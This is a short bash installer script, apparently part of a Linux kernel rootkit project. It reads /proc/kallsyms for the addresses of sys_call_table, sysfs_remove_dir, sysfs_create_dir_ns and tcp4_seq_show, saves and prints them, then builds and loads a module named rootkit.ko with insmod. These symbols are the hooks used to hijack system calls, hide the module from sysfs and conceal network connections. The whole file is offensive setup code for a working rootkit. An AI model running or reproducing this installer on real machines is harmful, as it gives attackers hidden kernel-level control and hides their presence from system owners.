#!/bin/bash
touch kallsyms_addresses
echo "|        create address file in ./kallsyms_addresses  |"
cat /proc/kallsyms | grep ' sys_call_table' | cut -b 1-16  > kallsyms_addresses
echo "|	       found the sys_call_table address       |"
cat /proc/kallsyms | grep ' sysfs_remove_dir'| cut -b 1-16  >> kallsyms_addresses
echo "|        found the sysfs_remove_dir addres            |"
cat /proc/kallsyms | grep ' sysfs_create_dir_ns'| cut -b 1-16  >> kallsyms_addresses
echo "|        found the sysfs_create_dir_ns address        |"
cat /proc/kallsyms | grep ' tcp4_seq_show' | cut -b 1-16 >> kallsyms_addresses
echo "|        found the tcp4_seq_show address              |"
#echo "found the system call table in ${sys_call_table_addr}"
echo "Found all the nessecriy addresess"


sys_call_table_addr=$(awk 'NR==1' kallsyms_addresses)
sysfs_remove_dir_addr=$(awk 'NR==2' kallsyms_addresses)
sysfs_create_dir_ns_addr=$(awk 'NR==3' kallsyms_addresses)
tcp4_seq_show_addr=$(awk 'NR==4' kallsyms_addresses)
echo "xxxxxxxx"
echo "addresses grom kallsyms:"
echo "$sys_call_table_addr"
echo "$sysfs_remove_dir_addr"
echo "$sysfs_create_dir_ns_addr"
echo "$tcp4_seq_show_addr"
echo "xxxxxxxx"
#cat kallsyms_addresses
make 
insmod rootkit.ko
